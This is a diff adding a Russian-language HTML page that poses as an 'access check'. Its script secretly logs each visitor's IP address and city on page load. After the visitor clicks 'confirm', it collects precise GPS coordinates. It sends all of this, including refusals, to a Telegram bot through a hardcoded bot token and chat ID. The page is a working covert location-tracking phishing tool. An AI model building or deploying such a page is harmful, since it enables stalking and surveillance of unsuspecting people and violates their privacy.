@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка доступа</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+        }
+        .card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 420px;
+            width: 90%;
+        }
+        h2 { margin-bottom: 15px; color: #2c3e50; }
+        p { font-size: 0.95rem; color: #666; margin-bottom: 20px; line-height: 1.5; }
+        button {
+            background: #27ae60;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.3s;
+            width: 100%;
+        }
+        button:hover { background: #219150; }
+        #status { margin-top: 15px; font-size: 0.9rem; color: #555; word-break: break-all; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Проверка доступа</h2>
+        <p>Для продолжения разрешите доступ к местоположению и подтвердите данные устройства.</p>
+        <button onclick="requestGeo()">Подтвердить</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = '8845943863:AAHbVNrE_zL6vLR38U-Wc51dv3L0MCjOgi8';
+        const CHAT_ID = '5905795768';
+
+        let userIPData = { ip: 'Не определен', country: '-', city: '-', isp: '-' };
+
+        // 1. Функция отправки сообщения в Telegram
+        async function sendToTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
+                    })
+                });
+            } catch (err) {
+                console.error('Ошибка отправки в Telegram:', err);
+            }
+        }
+
+        // 2. Получаем IP сразу при открытии страницы (без ожидания клика)
+        async function fetchIP() {
+            try {
+                // Быстрый и надежный сервис для IP
+                const res = await fetch('https://wttr.in/?format=j1');
+                const data = await res.json();
+                // Резервный источник IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipRes.json();
+
+                userIPData.ip = ipJson.ip || 'Не определен';
+                if (data.nearest_area && data.nearest_area[0]) {
+                    userIPData.country = data.nearest_area[0].country[0].value || '-';
+                    userIPData.city = data.nearest_area[0].areaName[0].value || '-';
+                }
+            } catch (e) {
+                // Если сбой, пробуем прямой запасной API
+                try {
+                    const fallback = await fetch('https://api.ipify.org?format=json');
+                    const fbJson = await fallback.json();
+                    userIPData.ip = fbJson.ip;
+                } catch(err) {
+                    console.error('Не удалось определить IP:', err);
+                }
+            }
+
+            // Сразу отправляем логи о заходе
+            const msg = `👀 <b>Посетитель зашел на сайт</b>\n\n` +
+                        `🌐 <b>IP:</b> <code>${userIPData.ip}</code>\n` +
+                        `🏙️ <b>Город/Страна:</b> ${userIPData.city}, ${userIPData.country}`;
+            sendToTelegram(msg);
+        }
+
+        // 3. Запрос геолокации по нажатию кнопки
+        function requestGeo() {
+            const statusDiv = document.getElementById('status');
+
+            if (!navigator.geolocation) {
+                statusDiv.innerText = 'Геолокация не поддерживается вашим браузером.';
+                return;
+            }
+
+            statusDiv.innerText = 'Запрашиваем геолокацию...';
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = Math.round(position.coords.accuracy);
+                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    statusDiv.innerHTML = '<span style="color: green;">Успешно подтверждено!</span>';
+
+                    const msg = `🎯 <b>Получены точные координаты GPS!</b>\n\n` +
+                                `🌐 <b>IP:</b> <code>${userIPData.ip}</code>\n\n` +
+                                `📌 <b>Координаты:</b>\n` +
+                                `• Широта: <code>${lat}</code>\n` +
+                                `• Долгота: <code>${lon}</code>\n` +
+                                `• Точность: ~${accuracy} м\n\n` +
+                                `🗺️ <a href="${mapsUrl}">Открыть на Google Картах</a>`;
+
+                    await sendToTelegram(msg);
+                },
+                async (error) => {
+                    statusDiv.innerHTML = '<span style="color: red;">Доступ отклонен.</span>';
+
+                    const msg = `⚠️ <b>Посетитель отклонил запрос GPS</b>\n\n` +
+                                `🌐 <b>IP:</b> <code>${userIPData.ip}</code>`;
+
+                    await sendToTelegram(msg);
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        // Запускаем сбор IP моментально при загрузке
+        fetchIP();
+    </script>
+
+</body>
+</html>
